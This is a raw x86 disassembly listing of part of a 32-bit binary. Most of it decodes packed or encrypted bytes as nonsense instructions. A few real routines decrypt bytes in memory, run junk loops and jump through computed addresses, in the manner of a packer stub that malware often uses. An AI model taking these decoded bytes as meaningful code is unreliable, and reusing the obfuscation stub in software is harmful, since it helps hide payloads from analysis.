  4072d6:	mov    al,0x47
  4072d8:	push   cs
  4072d9:	setne  BYTE PTR gs:[ecx+edx*8]
  4072de:	push   edx
  4072df:	sti    
  4072e0:	mov    edx,0x757bb7dd
  4072e5:	and    al,0x7c
  4072e7:	jmp    0x58fa:0x8c3db2bc
  4072ee:	cli    
  4072ef:	arpl   dx,bx
  4072f1:	arpl   WORD PTR [ebx+edx*8],cx
  4072f4:	xchg   BYTE PTR [edi+0x422d9c77],cl
  4072fa:	aas    
  4072fb:	cli    
  4072fc:	xor    DWORD PTR [edi],edi
  4072fe:	sub    DWORD PTR [esi+0x1e],edx
  407301:	mov    esp,0x77bbf275
  407306:	mov    eax,0xc7fe12ce
  40730b:	aaa    
  40730c:	xor    BYTE PTR [ecx],ch
  40730e:	(bad)  
  407310:	nop
  407311:	dec    ebx
  407312:	fwait
  407313:	mov    al,ds:0xe0e7b4f1
  407318:	aas    
  407319:	sbb    bl,BYTE PTR ds:[eax-0x73e8edca]
  407320:	(bad)  
  407321:	mov    dh,0x97
  407323:	push   edi
  407324:	bound  ecx,QWORD PTR [edx+0x5a]
  407327:	rcr    DWORD PTR [ebx-0x784aa10e],1
  40732d:	and    al,0x92
  40732f:	lea    sp,[ebp-0x1c]
  407333:	test   edi,ebx
  407335:	sbb    al,0x1f
  407337:	push   esi
  407338:	jno    0x4072ea
  40733a:	cmp    al,0xdc
  40733c:	add    cl,BYTE PTR [edi+0x5a8fa775]
  407342:	and    eax,0x246c630f
  407347:	das    
  407348:	jl     0x4072f7
  40734a:	sbb    esp,0x37
  40734d:	dec    ecx
  40734e:	jmp    0x407328
  407350:	xchg   esp,eax
  407351:	xlat   BYTE PTR ds:[ebx]
  407352:	xor    bh,dl
  407354:	out    0xbe,al
  407356:	push   ss
  407357:	test   al,0xe7
  407359:	and    al,0xa4
  40735b:	retf   
  40735c:	test   eax,0x8fcb30fe
  407361:	or     eax,0x3e78acfc
  407366:	fcmovu st,st(3)
  407368:	push   edx
  407369:	jo     0x407319
  40736b:	fs mov ch,0x6a
  40736e:	fs pop ebp
  407370:	(bad)  
  407371:	push   ebx
  407372:	das    
  407373:	and    BYTE PTR [ecx+edx*8-0x1c3b843f],ah
  40737a:	inc    edx
  40737b:	add    DWORD PTR [edi+edx*8],esp
  40737e:	push   ebx
  40737f:	fmulp  st(4),st
  407381:	in     eax,0xc7
  407383:	int3   
  407384:	sar    BYTE PTR [edx-0x72],0xbc
  407388:	sbb    DWORD PTR [edx-0x79],ecx
  40738b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40738c:	push   cs
  40738d:	js     0x40740c
  40738f:	mov    edi,0x198808b
  407394:	add    BYTE PTR [eax],al
  407396:	push   DWORD PTR [eax]
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	ja     0x407420
  4073e1:	xchg   esi,eax
  4073e2:	mov    gs,WORD PTR [ebx+0x207070c1]
  4073e8:	jge    0x40745a
  4073ea:	jo     0x40740d
  4073ec:	(bad)  
  4073ed:	call   0x822ec8e0
  4073f2:	sub    eax,0x29fd49ec
  4073f7:	fwait
  4073f8:	es es push cs
  4073fb:	sar    DWORD PTR [eax+edx*4-0x7f],cl
  4073ff:	or     ebp,DWORD PTR [ebx+0x23]
  407402:	rcr    BYTE PTR [ebp+0x50d2ba88],1
  407408:	mov    ebx,0xc3a434ef
  40740d:	adc    ebx,DWORD PTR [ecx+0x1c4480c5]
  407413:	cmp    DWORD PTR [ebp-0x73],esi
  407416:	adc    esi,DWORD PTR [ebp+0x29]
  407419:	sbb    dh,BYTE PTR [esi-0x7]
  40741c:	outs   dx,DWORD PTR ds:[esi]
  40741d:	in     al,0x85
  40741f:	pop    eax
  407420:	test   BYTE PTR [edx-0x7138fe90],cl
  407426:	inc    ecx
  407427:	daa    
  407428:	sahf   
  407429:	or     DWORD PTR [edx+0x6d],0x63
  40742d:	push   esp
  40742e:	adc    eax,0x330b5f28
  407433:	lock sbb eax,0x42ac1273
  407439:	mov    esi,0x7b06087
  40743e:	mov    dl,0xca
  407440:	mov    DWORD PTR [ecx],eax
  407442:	mov    esi,0x19ae1996
  407447:	mov    eax,ds:0xee1a4b31
  40744c:	xchg   edi,eax
  40744d:	pop    ss
  40744e:	int    0x45
  407450:	xor    esp,DWORD PTR ds:0xf0bb5edb
  407456:	cmp    BYTE PTR [edi+0x43],bl
  407459:	pop    edi
  40745a:	lds    eax,FWORD PTR [esi+0x2815f06b]
  407460:	fnstenv [esi+0x4dd55339]
  407466:	xor    DWORD PTR [edi],ebx
  407468:	cli    
  407469:	and    al,0x4f
  40746b:	sub    ah,al
  40746d:	scas   al,BYTE PTR es:[edi]
  40746e:	(bad)  
  40746f:	mov    ds,WORD PTR [ebx-0x564718ed]
  407475:	mov    BYTE PTR [eax+0x2734068e],0x3c
  40747c:	shl    BYTE PTR [eax],1
  40747e:	es ret 0x7d78
  407482:	sub    BYTE PTR [esi+edi*1+0x20aa4151],al
  407489:	mov    ah,0xb2
  40748b:	cmp    ebx,ebp
  40748d:	push   esp
  40748e:	call   0xa28df1d7
  407493:	(bad)  
  407494:	xchg   ebx,eax
  407495:	mov    DWORD PTR [edx-0x26],edi
  407498:	pop    eax
  407499:	(bad)  
  40749a:	mov    al,ds:0x801658bd
  40749f:	es jae 0x407424
  4074a2:	mov    dl,0x1e
  4074a4:	(bad)  
  4074a6:	fadd   DWORD PTR [ebx+0x6e]
  4074a9:	and    cl,al
  4074ab:	mov    ds:0x70e828d7,al
  4074b0:	mov    bl,0xc2
  4074b2:	int    0xd8
  4074b4:	mov    BYTE PTR [eax],bl
  4074b6:	cdq    
  4074b7:	xchg   DWORD PTR [edx],ebx
  4074b9:	stos   BYTE PTR es:[edi],al
  4074ba:	xchg   edx,eax
  4074bb:	cmp    al,0x4b
  4074bd:	push   ebx
  4074be:	dec    ebp
  4074bf:	xor    ah,dl
  4074c1:	adc    esi,DWORD PTR [eax-0x69aa76b3]
  4074c7:	lahf   
  4074c8:	add    al,0xcd
  4074ca:	cwde   
  4074cb:	jl     0x40750f
  4074cd:	mov    eax,0x71a4236c
  4074d2:	call   0xf267:0x591e7e0
  4074d9:	xor    ebp,ebx
  4074db:	aam    0x4e
  4074dd:	mov    WORD PTR [ebx-0x7c],ss
  4074e0:	pusha  
  4074e1:	pop    esi
  4074e2:	sbb    cl,BYTE PTR [edi-0x291ae513]
  4074e8:	es inc edi
  4074ea:	ror    ch,cl
  4074ec:	addr16 push es
  4074ee:	sbb    DWORD PTR [eax+ecx*1+0x13c33ff3],0x43eed153
  4074f9:	out    0xe3,eax
  4074fb:	loopne 0x407510
  4074fd:	xchg   ecx,eax
  4074fe:	loopne 0x40755c
  407500:	adc    edi,ecx
  407502:	or     eax,0x4ea61367
  407507:	dec    edx
  407508:	inc    esp
  407509:	dec    esi
  40750a:	mov    dh,0xf2
  40750c:	or     al,0xab
  40750f:	sub    edi,DWORD PTR [edi+0x15]
  407512:	dec    ebx
  407513:	in     al,0xbf
  407515:	add    ebp,DWORD PTR [esi+0x3e]
  407518:	and    DWORD PTR [ecx+edi*8],0x79
  40751c:	js     0x407502
  40751e:	add    BYTE PTR [edi-0x4d9f05ee],0xf3
  407525:	std    
  407526:	call   0xf72:0xf501e4d4
  40752d:	sub    dh,BYTE PTR [esi]
  40752f:	adc    eax,0x1dc0b8fa
  407534:	cmp    BYTE PTR [ebp+0x24],ch
  407537:	cmp    eax,0xc14b381b
  40753c:	(bad)  
  40753d:	xchg   edx,eax
  40753e:	xor    edx,DWORD PTR [edx+0x34705e44]
  407544:	stos   DWORD PTR es:[edi],eax
  407545:	push   0x7d
  407547:	push   0x79
  407549:	(bad)  
  40754a:	jae    0x407594
  40754c:	xchg   ebx,eax
  40754d:	mov    bh,0x72
  40754f:	jmp    0x71a6:0x80e37dbf
  407556:	add    eax,0x1b4f1223
  40755b:	in     al,0xc
  40755d:	mov    gs,WORD PTR [edx+0x14]
  407560:	pop    ss
  407561:	lods   al,BYTE PTR ds:[esi]
  407562:	jmp    0xa2dc:0xac53123f
  407569:	mov    eax,0x3559cd24
  40756e:	fimul  WORD PTR [ecx+0x12]
  407571:	mov    ebp,0x48f41c06
  407576:	leave  
  407577:	dec    esp
  407578:	fidiv  WORD PTR [ebx-0x3c427ca4]
  40757e:	cmp    DWORD PTR [ebx],edx
  407580:	leave  
  407581:	inc    esi
  407582:	add    eax,0xef85daf3
  407587:	inc    edi
  407588:	cdq    
  407589:	stos   DWORD PTR es:[edi],eax
  40758a:	push   cs
  40758b:	mov    ah,0x4
  40758d:	outs   dx,DWORD PTR ds:[esi]
  40758e:	pop    ebx
  40758f:	push   ds
  407590:	shr    BYTE PTR [ecx],0xdd
  407593:	push   esi
  407594:	push   ds
  407595:	test   DWORD PTR [ebx-0x38],ebx
  407598:	mov    esp,0x47375cbf
  40759d:	push   ebx
  40759e:	xor    BYTE PTR ds:[eax-0x1a1d84b8],bh
  4075a5:	ret    0xc7be
  4075a8:	div    dl
  4075aa:	outs   dx,DWORD PTR ds:[esi]
  4075ab:	sbb    al,0xc4
  4075ad:	repz fwait
  4075af:	setge  BYTE PTR [eax-0x2f8b2a8c]
  4075b6:	and    eax,0xfe383e6d
  4075bb:	cli    
  4075bc:	mov    al,ah
  4075be:	add    eax,0xe694a242
  4075c3:	ins    DWORD PTR es:[edi],dx
  4075c4:	fdiv   st(1),st
  4075c6:	outs   dx,BYTE PTR ds:[esi]
  4075c7:	je     0x407613
  4075c9:	inc    esi
  4075ca:	push   ecx
  4075cb:	sbb    edx,DWORD PTR [edx+0x7d]
  4075ce:	inc    esi
  4075cf:	add    BYTE PTR [edi+0x13ad8cdf],ah
  4075d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d6:	xor    ecx,ecx
  4075d8:	aas    
  4075d9:	das    
  4075da:	cmc    
  4075db:	mov    ebx,DWORD PTR [edx-0x2d062b59]
  4075e1:	gs js  0x4075b9
  4075e4:	sbb    esp,eax
  4075e6:	mov    bh,0x2f
  4075e8:	jle    0x40765d
  4075ea:	push   ebp
  4075eb:	retf   
  4075ec:	mov    dh,0x7f
  4075ee:	ds xchg ecx,eax
  4075f0:	cmp    ecx,DWORD PTR [eax-0x2c]
  4075f3:	jle    0x4075cd
  4075f5:	add    ch,BYTE PTR [edi]
  4075f7:	adc    eax,ecx
  4075f9:	ss dec edi
  4075fb:	dec    ebx
  4075fc:	cli    
  4075fd:	ja     0x4075db
  4075ff:	sub    al,0xf3
  407601:	xchg   esp,eax
  407602:	ins    DWORD PTR es:[edi],dx
  407603:	jne    0x40761e
  407605:	sti    
  407606:	dec    edx
  407607:	fdiv   DWORD PTR [ecx-0x45d59baa]
  40760d:	retf   0x3f87
  407610:	cwde   
  407611:	jae    0x407686
  407613:	sbb    DWORD PTR [edi+0x39],0xffffff99
  407617:	arpl   WORD PTR [edx],ax
  407619:	mov    fs,WORD PTR [edx+0x1a359287]
  40761f:	add    eax,0xb648d866
  407624:	test   eax,0x44d925d3
  407629:	stos   BYTE PTR es:[edi],al
  40762a:	ins    BYTE PTR es:[edi],dx
  40762b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40762c:	daa    
  40762d:	mov    ebp,0x2fcf69f4
  407632:	fisttp WORD PTR ds:0x687c27ee
  407638:	ins    DWORD PTR es:[edi],dx
  407639:	sar    DWORD PTR [esi-0x3f],1
  40763c:	add    ecx,DWORD PTR [eax]
  40763e:	cmp    edi,DWORD PTR cs:[edi-0x80]
  407642:	or     BYTE PTR [ebx],al
  407644:	popf   
  407645:	stc    
  407646:	adc    BYTE PTR [eax-0x7eb50e43],ch
  40764c:	push   edi
  40764d:	push   ebx
  40764e:	test   dl,0x75
  407651:	adc    dl,BYTE PTR [ebp-0x8264ec5]
  407657:	sub    al,0x4b
  407659:	xchg   edx,eax
  40765a:	out    dx,eax
  40765b:	(bad)  
  40765c:	dec    edx
  40765d:	xchg   edi,eax
  40765e:	sahf   
  40765f:	popa   
  407660:	sub    esi,DWORD PTR [eax+0x16]
  407663:	mov    bl,0x90
  407665:	jno    0x40760f
  407667:	and    BYTE PTR [ebp+0x1f],al
  40766a:	in     al,dx
  40766b:	(bad)  
  40766c:	call   0x4ceb:0xc225e117
  407673:	adc    eax,0x1cc437
  407678:	rcr    ebx,0x60
  40767b:	ins    DWORD PTR es:[edi],dx
  40767c:	push   ecx
  40767d:	xlat   BYTE PTR ds:[ebx]
  40767e:	iret   
  40767f:	ficomp DWORD PTR [eax-0x358176a7]
  407685:	push   eax
  407686:	dec    ebp
  407687:	jl     0x4076e0
  407689:	pop    esp
  40768a:	and    al,0x92
  40768c:	adc    bh,BYTE PTR [eax+ebx*8]
  40768f:	adc    edx,DWORD PTR [edx]
  407691:	xchg   edi,eax
  407692:	push   cs
  407693:	mov    ds:0x3db12b72,eax
  407698:	inc    esp
  407699:	test   eax,0xa3b5b7b4
  40769e:	rcl    bl,1
  4076a0:	pop    ds
  4076a1:	repz push es
  4076a3:	repz dec esi
  4076a5:	pop    esi
  4076a6:	mov    esp,0x5749f03a
  4076ab:	dec    esi
  4076ac:	jns    0x407651
  4076ae:	pusha  
  4076af:	push   ss
  4076b0:	inc    ebx
  4076b1:	addr16 mov edx,0x20e0811e
  4076b7:	mov    ecx,0xa673fad
  4076bc:	add    esi,ebx
  4076be:	mov    ah,dl
  4076c0:	mov    cl,0x31
  4076c2:	inc    ecx
  4076c3:	mov    edx,DWORD PTR [edx-0x4d]
  4076c6:	fcom   QWORD PTR [ebp-0x3c]
  4076c9:	sti    
  4076ca:	and    eax,0xbf57cd42
  4076cf:	xor    DWORD PTR [esi+0x3d],ecx
  4076d2:	pop    esi
  4076d3:	fidiv  DWORD PTR [ecx]
  4076d5:	dec    ecx
  4076d6:	(bad)  
  4076d7:	xchg   ebx,eax
  4076d8:	and    eax,0xe92a96bb
  4076dd:	xchg   ebp,eax
  4076de:	or     DWORD PTR [edx+0xaea9c9e],esp
  4076e4:	mov    ecx,0xec6af8d5
  4076e9:	xchg   ecx,eax
  4076ea:	repz jae 0x407757
  4076ed:	mov    al,0x79
  4076ef:	in     eax,dx
  4076f0:	ret    0x75d2
  4076f3:	lods   al,BYTE PTR ds:[esi]
  4076f4:	retf   
  4076f5:	fcomp  st(1)
  4076f7:	fistp  DWORD PTR [esi]
  4076f9:	xchg   ecx,eax
  4076fa:	jnp    0x407741
  4076fc:	push   ss
  4076fd:	aam    0xa7
  4076ff:	outs   dx,DWORD PTR ds:[esi]
  407700:	sbb    esp,ebx
  407702:	or     BYTE PTR [ebx+ecx*2+0x6c297447],al
  407709:	int3   
  40770a:	xor    ecx,DWORD PTR [esi-0x5fda4099]
  407710:	sti    
  407711:	cmp    ecx,edi
  407713:	clc    
  407714:	stos   DWORD PTR es:[edi],eax
  407715:	ret    0xe72
  407718:	dec    esi
  407719:	and    al,bl
  40771b:	dec    BYTE PTR [edx]
  40771d:	push   DWORD PTR [ebp-0x10]
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	adc    BYTE PTR [edx+0xf],al
  4078ca:	pop    eax
  4078cb:	pop    ebx
  4078cc:	into   
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x216aa570
  4078d6:	cwde   
  4078d7:	(bad)  
  4078d8:	cld    
  4078d9:	xchg   DWORD PTR [eax],edi
  4078db:	hlt    
  4078dc:	das    
  4078dd:	add    DWORD PTR [esi-0x4b],esi
  4078e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078e1:	pop    DWORD PTR [esi-0x27]
  4078e4:	jecxz  0x4078a8
  4078e6:	mov    al,0x50
  4078e8:	setge  BYTE PTR [ecx+0x1c9fab57]
  4078ef:	mov    dh,0x67
  4078f1:	icebp  
  4078f2:	addr16 inc edi
  4078f4:	xchg   edx,eax
  4078f5:	fnsave [ebx+0x1a459541]
  4078fb:	pusha  
  4078fc:	sar    eax,cl
  4078fe:	rol    DWORD PTR [edi+0x721073d],cl
  407904:	jb     0x4078db
  407906:	mov    ebp,0x3f6d55a3
  40790b:	and    dh,BYTE PTR [edx+edx*2+0x48]
  40790f:	stos   BYTE PTR es:[edi],al
  407910:	lock or eax,0xbe65ca9
  407916:	inc    ebx
  407917:	mov    eax,DWORD PTR [eax+ecx*1-0x28]
  40791b:	aas    
  40791c:	add    eax,0xcd68785b
  407921:	outs   dx,DWORD PTR ds:[esi]
  407922:	jg     0x407968
  407924:	jae    0x4078a9
  407926:	fcomp  DWORD PTR [edx]
  407928:	int    0x64
  40792a:	xor    esi,DWORD PTR [ecx]
  40792c:	add    al,BYTE PTR [ebx-0x7]
  40792f:	rol    BYTE PTR [edi+0x54efd1ad],cl
  407935:	pushf  
  407936:	xchg   edx,eax
  407937:	imul   edx,ecx,0x3c
  40793a:	enter  0x83bd,0xe3
  40793e:	dec    edi
  40793f:	push   ss
  407940:	and    DWORD PTR [ebp-0x41],ebx
  407943:	pop    edi
  407944:	mov    al,0x31
  407946:	repnz mov edi,DWORD PTR [esi-0x472370e]
  40794d:	pusha  
  40794e:	data16 arpl WORD PTR [ecx-0x72169731],cx
  407955:	sar    BYTE PTR fs:[si],1
  407959:	adc    DWORD PTR ds:0xa88ff38e,edi
  40795f:	mov    al,0x47
  407961:	jg     0x407977
  407963:	cmc    
  407964:	cmc    
  407965:	lahf   
  407966:	adc    DWORD PTR [esi],esp
  407968:	pop    ebp
  407969:	in     al,dx
  40796a:	and    DWORD PTR [ecx-0x11687d23],edi
  407970:	aas    
  407971:	jmp    0xb5b2:0x1d88a538
  407978:	pushf  
  407979:	leave  
  40797a:	pop    edi
  40797b:	push   0x51d54043
  407980:	cmp    DWORD PTR [edi-0x78],ebp
  407983:	aaa    
  407984:	sub    eax,0x797f56c4
  407989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40798a:	push   ss
  40798b:	pop    ecx
  40798c:	and    DWORD PTR [esi+0x72],esi
  40798f:	aaa    
  407990:	ss jae 0x40797b
  407993:	lods   eax,DWORD PTR ds:[esi]
  407994:	fdiv   DWORD PTR [edi+0x60b60a34]
  40799a:	inc    eax
  40799b:	adc    esi,DWORD PTR [edi-0x1a]
  40799e:	or     edx,DWORD PTR [esi+0x5f]
  4079a1:	loopne 0x407a00
  4079a3:	adc    esi,ebp
  4079a5:	inc    edi
  4079a6:	gs mov dl,0xec
  4079a9:	das    
  4079aa:	pop    esp
  4079ab:	push   eax
  4079ac:	cld    
  4079ad:	outs   dx,DWORD PTR ds:[esi]
  4079ae:	jmp    0x4079a5
  4079b0:	cli    
  4079b1:	out    0x92,al
  4079b3:	cwde   
  4079b4:	or     edi,DWORD PTR [esi-0x6f]
  4079b7:	sub    DWORD PTR [edi-0x6edf78d2],ebx
  4079bd:	repz out dx,eax
  4079bf:	and    BYTE PTR [esi],dh
  4079c1:	sbb    eax,0x64b1501d
  4079c6:	aas    
  4079c7:	lea    ebx,ds:0x27e637cf
  4079cd:	mov    esi,0xa326342
  4079d2:	les    ebx,FWORD PTR [ecx+0x4c3d8dde]
  4079d8:	xor    edx,DWORD PTR [edi-0x3799d138]
  4079de:	inc    ebx
  4079df:	or     eax,0xfc9599ef
  4079e4:	scas   al,BYTE PTR es:[edi]
  4079e5:	(bad)  
  4079e6:	stos   DWORD PTR es:[edi],eax
  4079e7:	jp     0x4079bc
  4079e9:	add    cl,bh
  4079eb:	ret    
  4079ec:	loop   0x4079ea
  4079ee:	dec    esi
  4079ef:	xchg   edi,eax
  4079f0:	loope  0x4079f9
  4079f2:	icebp  
  4079f3:	xchg   DWORD PTR [ecx],edi
  4079f5:	mov    bh,0x7b
  4079f7:	test   eax,0x4c72a735
  4079fc:	iret   
  4079fd:	mov    eax,ds:0xc0f01755
  407a02:	mov    esi,0xe31123cb
  407a07:	sub    al,0xe5
  407a09:	mov    ebp,0x6543f4ee
  407a0e:	sub    eax,0x4a5357ec
  407a13:	test   al,0x1e
  407a15:	inc    ebx
  407a16:	jno    0x4079c9
  407a18:	xchg   edx,eax
  407a19:	dec    eax
  407a1a:	dec    edi
  407a1b:	das    
  407a1c:	mov    esi,ecx
  407a1e:	pop    edi
  407a1f:	das    
  407a20:	xchg   esi,eax
  407a21:	sub    BYTE PTR [ebp+0xd],dh
  407a24:	dec    edx
  407a25:	or     edx,DWORD PTR [ebp+0x5d3adcdf]
  407a2b:	mov    ebp,0xec363448
  407a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a31:	adc    dl,BYTE PTR [esp+edx*4+0x186d6120]
  407a38:	cmp    ch,BYTE PTR [edi-0x53]
  407a3b:	es mov ebp,0xb07497a6
  407a41:	scas   eax,DWORD PTR es:[edi]
  407a42:	cld    
  407a43:	cs jle 0x407a93
  407a46:	std    
  407a47:	mov    ebx,0x7cb577dc
  407a4c:	pop    esi
  407a4d:	dec    edx
  407a4e:	in     eax,0xd2
  407a50:	mov    dh,0x18
  407a52:	pusha  
  407a53:	sahf   
  407a54:	ins    BYTE PTR es:[edi],dx
  407a55:	sbb    esi,esi
  407a57:	xor    DWORD PTR [ecx+0x31],ecx
  407a5a:	mov    ds:0x947e25a1,al
  407a5f:	xchg   ecx,eax
  407a60:	ret    0x28d4
  407a63:	inc    ecx
  407a64:	sbb    eax,0x1ff14669
  407a69:	adc    ebp,0xffffffb8
  407a6c:	adc    al,0xc0
  407a6e:	leave  
  407a6f:	adc    ecx,edx
  407a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a72:	in     eax,0xa9
  407a74:	fcom   QWORD PTR [edi+ebx*4]
  407a77:	push   es
  407a78:	push   ecx
  407a79:	stos   BYTE PTR es:[edi],al
  407a7a:	add    esi,DWORD PTR [edx]
  407a7c:	iret   
  407a7d:	cmp    BYTE PTR [eax-0x3d],0x2a
  407a81:	xor    BYTE PTR [eax],cl
  407a83:	push   ss
  407a84:	das    
  407a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a86:	iret   
  407a87:	inc    dh
  407a89:	inc    ecx
  407a8a:	imul   esp,DWORD PTR [eax],0x13bfce70
  407a90:	lods   al,BYTE PTR ds:[esi]
  407a91:	loope  0x407ae2
  407a93:	xor    DWORD PTR [edx],esp
  407a95:	mov    esp,0xcbc33cb6
  407a9a:	mov    ch,0x5a
  407a9c:	xor    eax,0xae3cca0c
  407aa1:	xor    DWORD PTR [ebp-0x41254731],esi
  407aa7:	enter  0xdc96,0xac
  407aab:	sub    BYTE PTR [edx+0x56dccc20],0x3e
  407ab2:	xor    DWORD PTR [edx-0x65c31cd1],edi
  407ab8:	xor    BYTE PTR [eax+0x3f],dl
  407abb:	rol    BYTE PTR [eax-0x27f872b5],cl
  407ac1:	add    eax,0xef2dbdaf
  407ac6:	or     DWORD PTR [edi+0x45c7e682],ebp
  407acc:	fdiv   DWORD PTR [ebx]
  407ace:	test   DWORD PTR [eax+edi*8+0x2dce1503],ebx
  407ad5:	inc    ebx
  407ad6:	add    bh,al
  407ad8:	inc    ebp
  407ad9:	aam    0x32
  407adb:	test   DWORD PTR [eax+edi*8+0x436a3d8b],ebx
  407ae2:	inc    ebx
  407ae3:	add    BYTE PTR [ecx],ch
  407ae5:	cmp    eax,0x434372
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi+0x3a92b7f9]
  407b18:	nop
  407b19:	test   eax,0x7070cc54
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0xb81e6f70
  407b25:	cmp    DWORD PTR [ebx],ebp
  407b27:	mov    al,ds:0x58323e31
  407b2c:	stc    
  407b2d:	add    dl,BYTE PTR [ecx+edi*2-0x43272ff]
  407b34:	xchg   ebx,eax
  407b35:	sub    DWORD PTR [eax-0x11],esp
  407b38:	inc    ecx
  407b39:	dec    edx
  407b3a:	ins    DWORD PTR es:[edi],dx
  407b3b:	cmp    eax,0xf0d3404b
  407b40:	pop    esp
